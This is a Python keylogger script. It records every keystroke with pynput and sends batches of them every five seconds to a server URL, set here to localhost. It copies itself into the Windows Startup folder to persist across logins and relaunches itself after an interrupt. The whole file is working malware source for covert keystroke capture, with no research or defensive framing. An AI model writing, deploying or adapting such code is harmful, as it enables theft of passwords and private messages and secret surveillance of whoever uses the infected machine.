import requests
import time
import sys
import os
from pynput import keyboard
import threading
from queue import Queue
import shutil

# URL of your local server
SERVER_URL = 'http://127.0.0.1:5000'

key_queue = Queue()
stop_event = threading.Event()

def server_is_available():
    try:
        response = requests.get(SERVER_URL)
        return response.status_code in [200, 405, 400]
    except requests.exceptions.RequestException:
        return False

def send_keys_to_server(keys):
    data = {'keys': keys}
    try:
        response = requests.post(SERVER_URL, json=data)
        if response.status_code == 200:
            print(f'Successfully sent keys: {keys} to server')
        else:
            print(f'Failed to send keys to server. Status code: {response.status_code}')
    except requests.exceptions.RequestException as e:
        print(f'Failed to send keys to server: {e}')

def key_sender():
    while not stop_event.is_set():
        keys = []
        while not key_queue.empty():
            keys.append(key_queue.get())
        if keys:
            send_keys_to_server(keys)
        time.sleep(5)  # Adjust the interval as needed

def on_press(key):
    try:
        if hasattr(key, 'char'):
            print(f'Alphanumeric key pressed: {key.char}')
            key_queue.put(str(key.char))
        else:
            print(f'Special key pressed: {key}')
            key_queue.put(str(key))
    except Exception as e:
        print(f'Error occurred: {e}')

def restart_script():
    python = sys.executable
    os.execl(python, python, *sys.argv)

def copy_to_startup():
    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    script_path = os.path.realpath(sys.argv[0])
    destination_path = os.path.join(startup_folder, os.path.basename(script_path))
    
    try:
        shutil.copy(script_path, destination_path)
        print(f'Script copied to {destination_path}')
    except Exception as e:
        print(f'Failed to copy script to startup folder: {e}')

if __name__ == "__main__":
    copy_to_startup()

    while True:
        while not server_is_available():
            print(f'Server at {SERVER_URL} not available yet, retrying in 5 seconds...')
            time.sleep(5)

        print(f'Server at {SERVER_URL} is now available. Starting keyboard listener.')

        sender_thread = threading.Thread(target=key_sender)
        sender_thread.start()

        try:
            with keyboard.Listener(on_press=on_press) as listener:
                listener.join()
        except KeyboardInterrupt:
            print('Keyboard interrupt detected. Stopping...')
            stop_event.set()
            sender_thread.join()
            restart_script()